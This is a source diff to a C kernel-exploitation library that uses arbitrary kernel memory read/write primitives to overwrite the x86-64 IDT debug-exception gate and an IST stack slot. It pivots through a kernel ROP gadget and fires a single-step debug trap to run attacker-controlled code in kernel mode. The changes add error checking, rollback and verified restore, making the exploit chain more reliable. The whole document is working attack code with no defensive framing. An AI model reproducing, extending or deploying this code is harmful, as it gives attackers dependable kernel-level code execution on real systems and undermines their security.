@@ -5,11 +5,10 @@ static int kwrite_q(khook_t *kh, uint64_t addr, uint64_t val)
   return kh->write(addr, &val, 8);
 }
 
-static uint64_t kread_q(khook_t *kh, uint64_t addr)
+static int kread_q_checked(khook_t *kh, uint64_t addr, uint64_t *val)
 {
-  uint64_t val = 0;
-  kh->read(addr, &val, 8);
-  return val;
+  *val = 0;
+  return kh->read(addr, val, 8);
 }
 
 static size_t putq(uint8_t *buf, size_t off, uint64_t val)
@@ -33,12 +32,18 @@ static void gate_encode(uint64_t off, uint16_t sel, uint8_t ist, uint8_t type, u
 
 static int probe_write(khook_t *kh, uint64_t addr)
 {
-  uint64_t save = kread_q(kh, addr);
+  uint64_t save, readback;
+  if (kread_q_checked(kh, addr, &save) != 0)
+    return 0;
   uint64_t test = save ^ 0xA5A5A5A5A5A5A5A5ULL;
-  kwrite_q(kh, addr, test);
-  uint64_t readback = kread_q(kh, addr);
-  kwrite_q(kh, addr, save);
-  return readback == test;
+  if (kwrite_q(kh, addr, test) != 0)
+    return 0;
+  int read_ok = kread_q_checked(kh, addr, &readback) == 0;
+  if (kwrite_q(kh, addr, save) != 0)
+    return 0;
+  uint64_t restored;
+  return read_ok && readback == test &&
+         kread_q_checked(kh, addr, &restored) == 0 && restored == save;
 }
 
 static uint64_t ist_slot_va(const khook_t *kh)
@@ -300,6 +305,7 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   size_t iret_tramp_off, save_len, handler_len, restore_off, off;
   uint64_t slot_rdi, slot_rsi, slot_rdx;
   uint64_t db_gate, ist, lo, hi;
+  int install_error;
 
   if (!kh || kh->installed)
     return -1;
@@ -313,9 +319,10 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   db_gate = kh->idt_base + 16 * KH_VEC_DB;
   ist = ist_slot_va(kh);
 
-  kh->saved_gate_lo = kread_q(kh, db_gate);
-  kh->saved_gate_hi = kread_q(kh, db_gate + 8);
-  kh->saved_ist     = kread_q(kh, ist);
+  if (kread_q_checked(kh, db_gate, &kh->saved_gate_lo) != 0 ||
+      kread_q_checked(kh, db_gate + 8, &kh->saved_gate_hi) != 0 ||
+      kread_q_checked(kh, ist, &kh->saved_ist) != 0)
+    return -17;
   kh->kcs           = (uint16_t)(kh->saved_gate_lo >> 16);
   if (!kh->kcs)
     return -4;
@@ -333,7 +340,11 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   }
 
   // Check if TSS RSP is valid-looking
-  if ((kread_q(kh, kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + 0x04) >> 47) != 0x1FFFFULL)
+  uint64_t tss_rsp;
+  if (kread_q_checked(kh, kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + 0x04,
+                      &tss_rsp) != 0)
+    return -17;
+  if ((tss_rsp >> 47) != 0x1FFFFULL)
     return -15;
 
   scratch    = kh->scratch_base;
@@ -438,39 +449,73 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   if (kh->write(scratch, img, sizeof img) != 0)
     return -7;
 
-  if (kwrite_q(kh, ist, arm_chain) != 0)
-    return -8;
+  if (kwrite_q(kh, ist, arm_chain) != 0) {
+    install_error = -8;
+    goto rollback;
+  }
 
   gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET), kh->kcs, kh->ist_index,
               KH_GATE_INTERRUPT, 0, 1, &lo, &hi);
-  if (kwrite_q(kh, db_gate + 8, hi) != 0)
-    return -9;
-  if (kwrite_q(kh, db_gate, lo) != 0)
-    return -10;
+  if (kwrite_q(kh, db_gate + 8, hi) != 0) {
+    install_error = -9;
+    goto rollback;
+  }
+  if (kwrite_q(kh, db_gate, lo) != 0) {
+    install_error = -10;
+    goto rollback;
+  }
 
-  if (kread_q(kh, ist) != arm_chain)
-    return -13;
-  if (kread_q(kh, db_gate) != lo || kread_q(kh, db_gate + 8) != hi)
-    return -12;
+  uint64_t check_ist, check_lo, check_hi;
+  if (kread_q_checked(kh, ist, &check_ist) != 0 || check_ist != arm_chain) {
+    install_error = -13;
+    goto rollback;
+  }
+  if (kread_q_checked(kh, db_gate, &check_lo) != 0 ||
+      kread_q_checked(kh, db_gate + 8, &check_hi) != 0 ||
+      check_lo != lo || check_hi != hi) {
+    install_error = -12;
+    goto rollback;
+  }
 
   kh->installed = 1;
   return 0;
+
+rollback:;
+  /* A failed installation can leave a partial gate/IST update. Report a
+     separate error if even the saved state cannot be restored and verified. */
+  int rollback_failed = 0;
+  if (kwrite_q(kh, db_gate + 8, kh->saved_gate_hi) != 0)
+    rollback_failed = 1;
+  if (kwrite_q(kh, db_gate, kh->saved_gate_lo) != 0)
+    rollback_failed = 1;
+  if (kwrite_q(kh, ist, kh->saved_ist) != 0)
+    rollback_failed = 1;
+  if (kread_q_checked(kh, db_gate, &check_lo) != 0 ||
+      kread_q_checked(kh, db_gate + 8, &check_hi) != 0 ||
+      kread_q_checked(kh, ist, &check_ist) != 0 ||
+      check_lo != kh->saved_gate_lo || check_hi != kh->saved_gate_hi ||
+      check_ist != kh->saved_ist)
+    rollback_failed = 1;
+  if (rollback_failed)
+    return -18;
+  return install_error;
 }
 
-void kh_trigger(khook_t *kh)
+int kh_trigger(khook_t *kh)
 {
   uint64_t resume_rsp, rbp_val;
   void *resume_label = &&resumed;
 
   if (!kh || !kh->installed)
-    return;
+    return -1;
 
   __asm__ volatile("mov %%rsp, %0" : "=r"(resume_rsp));
   __asm__ volatile("mov %%rbp, %0" : "=r"(rbp_val));
 
-  kwrite_q(kh, kh->scratch_base + KH_OFF_RESUME + KH_RC_RBP, rbp_val);
-  kwrite_q(kh, kh->arm_rip_slot, (uint64_t)resume_label);
-  kwrite_q(kh, kh->arm_rsp_slot, resume_rsp);
+  if (kwrite_q(kh, kh->scratch_base + KH_OFF_RESUME + KH_RC_RBP, rbp_val) != 0 ||
+      kwrite_q(kh, kh->arm_rip_slot, (uint64_t)resume_label) != 0 ||
+      kwrite_q(kh, kh->arm_rsp_slot, resume_rsp) != 0)
+    return -2;
 
   __asm__ volatile(
       "pushfq             \n\t"
@@ -479,7 +524,7 @@ void kh_trigger(khook_t *kh)
       "nop                \n\t"   // single-step #DB
       ::: "memory", "cc");
 resumed:
-  return;
+  return 0;
 }
 
 int kh_disarm(khook_t *kh)
@@ -515,13 +560,12 @@ int kh_disarm(khook_t *kh)
   if (kwrite_q(kh, ist, scratch + KH_OFF_CHAIN_ARM) != 0)
     return -3;
 
-  kh_trigger(kh);
-  return 0;
+  return kh_trigger(kh);
 }
 
 int kh_restore(khook_t *kh)
 {
-  uint64_t db_gate, ist;
+  uint64_t db_gate, ist, check_lo, check_hi, check_ist;
 
   if (!kh || !kh->installed)
     return -1;
@@ -529,9 +573,21 @@ int kh_restore(khook_t *kh)
   db_gate = kh->idt_base + 16 * KH_VEC_DB;
   ist = ist_slot_va(kh);
 
-  kwrite_q(kh, db_gate + 8, kh->saved_gate_hi);
-  kwrite_q(kh, db_gate, kh->saved_gate_lo);
-  kwrite_q(kh, ist, kh->saved_ist);
+  int restore_failed = 0;
+  if (kwrite_q(kh, db_gate + 8, kh->saved_gate_hi) != 0)
+    restore_failed = 1;
+  if (kwrite_q(kh, db_gate, kh->saved_gate_lo) != 0)
+    restore_failed = 1;
+  if (kwrite_q(kh, ist, kh->saved_ist) != 0)
+    restore_failed = 1;
+  if (restore_failed)
+    return -2;
+  if (kread_q_checked(kh, db_gate, &check_lo) != 0 ||
+      kread_q_checked(kh, db_gate + 8, &check_hi) != 0 ||
+      kread_q_checked(kh, ist, &check_ist) != 0 ||
+      check_lo != kh->saved_gate_lo || check_hi != kh->saved_gate_hi ||
+      check_ist != kh->saved_ist)
+    return -3;
   kh->installed = 0;
   return 0;
 }
